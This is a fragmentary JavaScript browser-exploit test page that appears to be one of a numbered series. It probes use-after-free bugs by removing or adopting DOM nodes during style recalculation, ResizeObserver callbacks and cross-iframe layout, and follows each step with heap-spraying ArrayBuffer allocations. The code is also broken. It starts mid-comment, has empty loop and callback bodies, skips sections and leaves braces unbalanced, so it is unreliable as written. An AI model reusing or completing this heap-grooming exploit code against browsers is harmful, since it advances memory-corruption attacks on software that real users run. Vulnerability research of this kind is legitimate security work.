  UAF + memory buffer errors, the likely target is DOM tree manipulation during
  layout/style recalc, or node lifecycle during event dispatch. We test patterns
  that combine DOM mutation with layout-triggering operations.

  Patterns tested:
  A) Node removal during style recalculation (getComputedStyle forces recalc)
  B) DOM mutation inside ResizeObserver callback
  C) IntersectionObserver callback with removed target
  D) Custom element lifecycle callbacks during DOM mutation
  E) adoptNode during layout (moves node between documents mid-style)

  CRASH_CLASS: MODERATE (UAF through stale DOM/layout reference)
  prior art: p684 (DOM mutation UAF), p685 (Range/Selection UAF)
-->

  // === SECTION A: Node removal during forced style recalc ===

    style.textContent = '.styled-0:hover ~ div { color: blue; }';
    document.head.appendChild(style);

    // Force initial layout
    container.getBoundingClientRect();

    // Now: remove nodes while forcing style recalc on siblings
    for (var i = 0; i < 32; i++) {
      container.removeChild(nodes[i * 2]); // remove even nodes
      // Force recalc on odd nodes (which reference removed siblings via ~)
      if (nodes[i * 2 + 1] && nodes[i * 2 + 1].parentNode) {

      }
    }
    b('A:REMOVED-32-RECALCED');

    // GC + spray
    nodes = null;
    for (var i = 0; i < 5000; i++) new ArrayBuffer(1024);
    var spray = [];
    for (var i = 0; i < 2048; i++) spray.push(new ArrayBuffer(48));

  // === SECTION B: ResizeObserver callback mutation ===
  b('B:RESIZE-OBSERVER');
  try {
    var box = document.createElement('div');
    box.style.cssText = 'width:100px;height:100px;overflow:hidden;';
    document.body.appendChild(box);

    var inner = document.createElement('div');
    inner.style.cssText = 'width:200px;height:200px;background:green;';

        if (!observed) {

          // Remove the observed element during callback

          }

          // GC + spray
          for (var i = 0; i < 3000; i++) new ArrayBuffer(1024);
          var spray2 = [];
          for (var i = 0; i < 1024; i++) spray2.push(new ArrayBuffer(48));

      // Trigger resize

      setTimeout(function() {

        // GC + spray
        for (var i = 0; i < 5000; i++) new ArrayBuffer(1024);

        b('D:NO-CUSTOM-ELEMENTS');
      }
      runSectionE();
    } catch(e) {
      b('D:ERR:' + e.message);
      runSectionE();

  function runSectionE() {
    // === SECTION E: adoptNode during layout ===
    b('E:ADOPT-NODE');
    try {
      var iframe = document.createElement('iframe');
      iframe.srcdoc = '<div id="adopt-target" style="width:100px;height:100px;background:yellow;">adopt me</div>';
      document.body.appendChild(iframe);

      setTimeout(function() {
        try {
          var iDoc = iframe.contentDocument;
          var target = iDoc.getElementById('adopt-target');

          if (target) {
            // Force layout in iframe
            target.getBoundingClientRect();

            // Adopt node into main document mid-layout
            var adopted = document.adoptNode(target);
            b('E:ADOPTED:tag=' + adopted.tagName);

            // Force layout in main document immediately
            document.body.appendChild(adopted);

            // GC + spray
            for (var i = 0; i < 3000; i++) new ArrayBuffer(1024);
